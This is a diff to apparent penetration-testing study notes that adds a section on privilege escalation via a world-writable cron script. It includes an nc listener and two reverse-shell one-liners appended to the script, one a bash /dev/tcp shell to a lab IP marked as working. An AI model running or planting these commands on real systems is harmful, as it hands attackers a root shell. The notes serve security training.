@@ -2450,7 +2450,19 @@ Reference
   - inspect the output of the ps command  
     `watch -n 1 "ps -aux | grep pass"`  
   - look at the list of running processes  
-    `ps aux | grep flag`  
+    `ps aux | grep flag`
+- 18.3.1 Abusing cron jobs
+  - Which log file holds information about cron job activities?  
+    `grep "CRON" /var/log/syslog`  
+  - look for misconfigured cron job "-rwxrwxrw-", obtain root shell  
+    ```
+    ls -lah /tmp/this_is_fine.sh 
+    nc -lnvp 4444
+    cd /tmp/
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> this_is_fine.sh //not working
+    echo 'bash -i >& /dev/tcp/192.168.45.221/4444 0>&1' >> this_is_fine.sh //working
+    ```
+- ddd
 
 ## Penetration testing report 
 - note editor:
